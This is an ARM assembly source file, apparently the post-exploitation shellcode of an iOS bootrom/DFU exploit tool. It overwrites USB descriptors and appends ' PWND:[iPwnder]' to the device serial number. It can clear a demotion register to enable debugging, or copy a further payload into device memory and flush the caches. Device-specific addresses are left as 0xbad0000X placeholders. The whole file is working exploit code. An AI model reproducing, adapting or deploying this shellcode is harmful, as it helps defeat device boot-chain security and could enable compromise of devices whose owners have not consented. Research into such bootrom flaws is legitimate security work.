.text

.pool
.set PAYLOAD_OFFSET,               0xbad00008
.set PAYLOAD_SIZE,                 0xbad00009
.set PAYLOAD_DEST,                 0xbad00007
.set PAYLOAD_PTR,                  0xbad0000a
.set gUSBSerialNumber,             0xbad00002
.set gUSBSRNMStringDescriptor,     0xbad00004
.set gUSBDescriptors,              0xbad00001
.set usb_create_string_descriptor, 0xbad00003
.set demote_flag,                  0xbad00005
.set gDemotionRegister,            0xbad00006

.code 32
.global _main
_main:
    mov  r4, #0                 // HACK: do not free this usb request
    push {r4-r7,lr}

    ldr  r0, =gUSBDescriptors
    ldrd r0, r1, [r0]
    adr  r2, USB_DESCRIPTOR
    ldrd r4, r5, [r2]
    strd r4, r5, [r0]
    strd r4, r5, [r1]
    ldrd r4, r5, [r2, #0x8]
    strd r4, r5, [r0, #0x8]
    strd r4, r5, [r1, #0x8]
    ldrd r4, r5, [r2, #0x10]
    strd r4, r5, [r0, #0x10]
    strd r4, r5, [r1, #0x10]
    ldrd r4, r5, [r2, #0x18]
    strd r4, r5, [r0, #0x18]
    strd r4, r5, [r1, #0x18]

    ldr  r0, =gUSBSerialNumber

_find_zero_loop:
    add  r0, r0, #1
    ldrb r1, [r0]
    cmp  r1, #0
    bne  _find_zero_loop

    adr  r1, PWND_STRING
    ldr  r2, [r1]
    ldr  r3, [r1, #0x4]
    str  r2, [r0]
    str  r3, [r0, #0x4]
    ldr  r2, [r1, #0x8]
    ldr  r3, [r1, #0xc]
    str  r2, [r0, #0x8]
    str  r3, [r0, #0xc]

    ldr  r0, =gUSBSerialNumber
    ldr  r1, =usb_create_string_descriptor
    ldr  r4, =gUSBSRNMStringDescriptor
    blx  r1
    strb r0, [r4]

    ldr  r0, =demote_flag
    cmp  r0, #1
    bne  _copy_payload

_demotion:
    ldr  r1, =gDemotionRegister
    ldr  r0, [r1]
    tst  r0, #1
    beq  _end

    ldr  r0, [r1]
    and  r0, r0, #0xfffffffe
    str  r0, [r1]
    mcr  p15, 0, r0, c7, c14, #1
    dmb  sy
    b    _end

_copy_payload:
    ldr  r0, =PAYLOAD_DEST
    adr  r1, _main
    ldr  r2, =PAYLOAD_OFFSET
    add  r1, r1, r2
    mov  r2, #0
    ldr  r3, =PAYLOAD_SIZE
    ldr  r4, =PAYLOAD_PTR
    add  r5, r0, #9
    str  r5, [r4]

_copy_loop:
    ldrd r4, r5, [r1]
    strd r4, r5, [r0]
    ldrd r4, r5, [r1, #0x8]
    strd r4, r5, [r0, #0x8]
    ldrd r4, r5, [r1, #0x10]
    strd r4, r5, [r0, #0x10]
    ldrd r4, r5, [r1, #0x18]
    strd r4, r5, [r0, #0x18]
    ldrd r4, r5, [r1, #0x20]
    strd r4, r5, [r0, #0x20]
    ldrd r4, r5, [r1, #0x28]
    strd r4, r5, [r0, #0x28]
    ldrd r4, r5, [r1, #0x30]
    strd r4, r5, [r0, #0x30]
    ldrd r4, r5, [r1, #0x38]
    strd r4, r5, [r0, #0x38]
    mcr  p15, 0, r0, c7, c14, #1
    dmb  sy
    add  r0, r0, #0x40
    add  r1, r1, #0x40
    add  r2, r2, #0x40
    cmp  r2, r3
    bcc  _copy_loop

_end:
    mov  r0, #0
    mcr  p15, 0, r0, c7, c5, #0
    dsb
    isb

    pop  {r4-r7,pc}

USB_DESCRIPTOR:
.word 0x190209, 0x80050101, 0x409fa, 0x1fe0000, 0x21070000, 0xa01, 0x8, 0x0

PWND_STRING:
.asciz " PWND:[iPwnder]"
